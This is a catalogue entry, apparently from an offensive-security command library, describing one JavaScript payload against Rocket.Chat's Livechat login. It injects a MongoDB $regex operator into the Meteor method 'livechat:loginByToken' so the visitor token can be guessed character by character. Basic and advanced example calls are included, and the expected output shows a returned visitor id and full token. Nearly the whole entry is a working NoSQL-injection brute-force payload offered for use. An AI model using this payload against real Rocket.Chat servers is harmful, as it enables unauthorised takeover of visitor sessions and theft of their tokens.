---
data: >-
  Meteor.call('livechat:loginByToken', {"$regex":
  "^${knownValid}[${guesses}]"});
tags:
  - nosql-injection
  - bruteforce
type: command
output: Object with _id on success; error/null otherwise
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.815Z'
id: 4eee5f8f-b87f-403b-8e87-f036057d1145
verified: false
validated: true
submitted: true
---
# meteor-call-livechat-loginbytoken-regex

## Command

```javascript
Meteor.call('livechat:loginByToken', {"$regex": "^${knownValid}[${guesses}]"});
```

## Description

Executes a Meteor method call to Rocket.Chat's Livechat login, injecting a MongoDB $regex operator to test token patterns during bruteforce. Used in loops to guess hex characters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| guess | Regex object like {"$regex": "^prefix[chars]"} for pattern matching | Yes |

## Examples

### Basic Usage

```javascript
Meteor.call('livechat:loginByToken', {"$regex": "^a"});
```

### Advanced Usage

```javascript
Meteor.call('livechat:loginByToken', {"$regex": "^a[0-9]"});
```

## Expected Output

Successful match: `{ _id: 'visitor_id', token: 'full_token', ... }`; Failure: Error or null.

## Related

- [[Related Procedure: Bruteforce-Visitor-Token-via-NoSQL-Injection]]
